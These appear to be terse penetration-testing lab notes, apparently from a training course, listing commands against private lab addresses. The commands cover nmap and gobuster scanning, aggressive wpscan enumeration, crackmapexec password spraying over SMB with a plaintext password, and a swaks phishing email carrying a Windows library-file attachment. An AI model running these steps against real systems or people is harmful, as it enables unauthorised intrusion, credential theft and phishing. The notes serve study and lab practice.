```
sudo nmap -sC -sV -oN mailsrv1/nmap 192.168.50.242

search for available exploits

gobuster dir -u http://192.168.213.242 -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config

wpscan --url http://192.168.50.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan

keep noting all username and passwords

create a list user.txt and pass.txt from gathered info

crackmapexec smb 192.168.225.242 -u user.txt -p pass.txt --continue-on-success

crackmapexec smb 192.168.50.242 -u john -p "dqsTwTpZPn#nL" --shares

In case of windows either phishing mail or windows library files

sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap


```